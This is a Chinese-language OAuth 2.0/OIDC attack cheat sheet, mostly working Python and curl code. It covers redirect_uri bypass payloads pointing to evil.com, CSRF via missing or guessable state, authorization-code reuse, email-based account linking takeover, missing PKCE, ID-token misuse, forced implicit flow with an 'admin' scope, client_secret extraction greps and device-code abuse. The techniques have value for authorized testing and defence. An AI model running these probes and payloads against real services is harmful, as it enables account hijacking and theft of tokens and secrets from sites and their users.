# OAuth 2.0 / OIDC 攻击实战

## 攻击面

```
OAuth 流程四阶段，每阶段都有攻击点:

  Client ──▶ /authorize ──▶ /token ──▶ /userinfo ──▶ API
              │   ▲           │  ▲        │  ▲
              │ redirect_uri  │ code      │  ID Token
              │ state/nonce   │ reuse     │  aud 缺失
              │ PKCE          │           │
```

## 1. redirect_uri 攻击

```python
# 探测 redirect_uri 验证逻辑
import requests

TARGET = "https://target.com/oauth/authorize"
CLIENT_ID = "from_app_registration"

PAYLOADS = [
    # 基础开放重定向
    "https://evil.com/callback",
    # 子域名欺骗
    "https://target.com.evil.com/callback",
    # 协议相对
    "//evil.com/callback",
    # userinfo 混淆
    "https://target.com@evil.com/callback",
    # 未注册但同域的路径
    "https://target.com/other-app/callback",
    # 参数污染 (两个 redirect_uri)
    "https://legit.com/callback&redirect_uri=https://evil.com/callback",
    # fragment 混淆
    "https://legit.com/callback#@evil.com/callback",
    # 开放重定向链
    "https://legit.com/callback?next=https://evil.com",
]

for uri in PAYLOADS:
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": uri,
        "scope": "openid profile email",
        "state": "x"
    }
    r = requests.get(TARGET, params=params, allow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("Location", "")
        if "evil.com" in loc:
            print(f"[!] BYPASS: {uri} → {loc}")
    elif "invalid" not in r.text.lower():
        print(f"[?] UNKNOWN: {uri} → {r.status_code}")
```

## 2. state/nonce 缺失 → CSRF

```python
# 如果没有 state 或 state 可预测:
# 攻击者先用自己的账号完成 OAuth，拿到 code
# 然后诱导受害者访问:
#   https://target.com/oauth/callback?code=ATTACKER_CODE&state=KNOWN
# 受害者浏览器发起请求 → 服务端把攻击者的 code 换成 access_token
# → 受害者浏览器存储攻击者的 token → 受害者以攻击者身份操作
# 攻击者再读自己账号下的内容 → 可能看到受害者误传的数据

# 检测脚本
def test_state_csrf(auth_url: str, client_id: str, redirect_uri: str):
    # 步骤 1: 不传 state
    r1 = requests.get(auth_url, params={
        "response_type": "code", "client_id": client_id,
        "redirect_uri": redirect_uri
    }, allow_redirects=False)
    if r1.status_code in (301, 302):
        print("[i] No state required — CSRF possible")

    # 步骤 2: state 可预测? (如: 固定值, 递增数字, base64(时间戳))
    for guess in ["1", "state", "ok", "true", "test", "x"]:
        r2 = requests.get(auth_url, params={
            "response_type": "code", "client_id": client_id,
            "redirect_uri": redirect_uri, "state": guess
        })
        if "invalid" not in r2.text.lower():
            print(f"[!] Predictable state: {guess}")
```

## 3. code 复用

```python
# 如果同一个 authorization code 可以被不同用户使用:
#   → code 没有绑定 session/client
# 测试方法:
# 1. 用账号 A 拿到 code
# 2. 清空 cookie，换 IP
# 3. 用账号 B 的 session 去 /token 换 token
# 4. 如果换成功 → code 未绑定 client

def test_code_reuse(token_url: str, code: str, client_id: str, redirect_uri: str):
    # 第一次: 正常换取 token
    r1 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    assert r1.status_code == 200, "First exchange failed"
    token1 = r1.json().get("access_token")

    # 第二次: 相同的 code 再次换取
    r2 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    if r2.status_code == 200:
        print("[!] Code reuse possible!")
```

## 4. 邮箱关联账号劫持

```python
# 场景: 系统允许 Google/Facebook/GitHub 登录
# 如果登录逻辑是: 查邮箱 → 有则绑定账号
# 而没有验证 iss (签发者):

# 攻击:
# 1. 在 IdP-A (如 GitHub) 注册 target@company.com 邮箱
#    (GitHub 不验证邮箱所有权)
# 2. 用 GitHub OAuth 登录 → 系统查到 target@company.com
#    已有关联账号 → 绑定成功 → 登录为目标用户

# 防御要求: 必须同时验证 iss + email
# 不能仅凭 email 绑定
```

## 5. PKCE 缺失

```python
# 如果没有 PKCE (Proof Key for Code Exchange):
# 恶意应用可以拦截 authorization code

# 检测: 看 /authorize 是否需要 code_challenge 参数
r = requests.get("https://target.com/oauth/authorize", params={
    "response_type": "code", "client_id": "public_client_id",
    "redirect_uri": "app://callback",
    "code_challenge": "invalid_challenge",
    "code_challenge_method": "S256"
})
# 如果返回 200 且不带 code_challenge 也能拿到 code → PKCE 非强制
```

## 6. ID Token 当 Access Token

```python
# 抓取 OIDC 流程中的 id_token
# 尝试用 id_token 调用 API:
resp = requests.get("https://target.com/api/user/profile",
    headers={"Authorization": f"Bearer {id_token}"})
# 如果 200 → ID Token 被当作 Access Token 接受
# 可能绕过 scope 限制 (ID Token 不包含 scope claim)
```

## 7. Implicit Flow 攻击

```python
# Implicit Flow 直接在 URL fragment 中返回 access_token
# https://target.com/callback#access_token=xxx&token_type=bearer

# 攻击面:
# 1. Referer 泄露 token (fragment 可能在 Referer 中)
# 2. history 窃取
# 3. 如果没验证 redirect_uri → 直接拿 token

# 强制 implicit flow (如果 authorization_code 受限)
def force_implicit(client_id: str, redirect_uri: str):
    return requests.get("https://target.com/oauth/authorize", params={
        "response_type": "token",      # ← implicit 模式
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile admin",
        "state": "x"
    })
```

## 8. Client Secret 提取

```bash
# 常见泄露位置:
# 1. JS 源码硬编码
grep -r "client_secret\|clientSecret\|CLIENT_SECRET" --include="*.js" .
# 2. 移动端 APK 反编译
strings app.apk | grep -i "client_secret\|secret"
# 3. Source maps / .map 文件
# 4. Public config endpoints: /config, /env, /.env
# 5. Git 历史
git log -p | grep -i "client_secret"

# 拿到 client_secret 后 → 可进行 confidential client 的所有操作
```

## 9. Device Code Flow 滥用

```python
# Device Code Flow (设备授权) — 适用于 TV/IoT
# 如果未限制 device_code 速率:
# 1. 持续尝试 user_code → 可能暴力猜解
# 2. 短间隔轮询 → 等待用户输入后立即换取 token
# https://target.com/oauth/device/code
```

## 工具命令

```bash
# 完整 OAuth 流程抓取
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://callback&scope=openid%20profile&state=x"
curl -X POST "https://target.com/oauth/token" -d "grant_type=authorization_code&code=xxx&client_id=xxx&redirect_uri=https://callback"
curl -X POST "https://target.com/oauth/token" -d "grant_type=refresh_token&refresh_token=xxx&client_id=xxx"
curl -X POST "https://target.com/oauth/token" -d "grant_type=client_credentials&client_id=xxx&client_secret=xxx"
python3 jwt_tool.py <id_token>
curl https://target.com/.well-known/openid-configuration | jq .
```

## Evidence

记录: 完整流程每个 HTTP 请求/响应、redirect_uri payload、code/token/refresh_token、client_secret 来源、token 能访问的 API。
